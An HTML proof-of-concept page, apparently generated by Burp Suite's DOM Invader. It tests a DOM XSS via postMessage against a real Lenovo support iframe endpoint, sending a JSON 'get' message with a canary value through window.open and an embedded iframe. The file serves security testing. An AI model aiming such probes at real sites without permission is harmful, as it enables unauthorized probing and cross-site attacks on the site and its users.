<!doctype html>
        <html>
            <head>
                <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
                <meta charset="UTF-8" />
                <title>Postmessage PoC</title>
                <script>
                    function pocLink() {
                        let win = window.open('https://support.lenovo.com/api/v4/upsellAggregation/footprints/iframe');
                        let msg = "{\n    \"type\": \"get\",\n    \"key\": \"mtb6kq750-\",\n    \"value\": \"mtb6kq750-\"\n}";
                        msg=JSON.parse(msg);
                        setTimeout(function(){
                            win.postMessage(msg, '*');
                        }, 5000);
                    }
                    function pocFrame(win) {           
                        let msg = "{\n    \"type\": \"get\",\n    \"key\": \"mtb6kq750-\",\n    \"value\": \"mtb6kq750-\"\n}";
                        msg=JSON.parse(msg);
                        win.postMessage(msg, '*');          
                    }
                </script>
            </head>
            <body>
                <a href="#" onclick="pocLink();">PoC link</a>          
                <iframe src="https://support.lenovo.com/api/v4/upsellAggregation/footprints/iframe" onload="pocFrame(this.contentWindow)"></iframe>                    
            </body>
        </html>
        
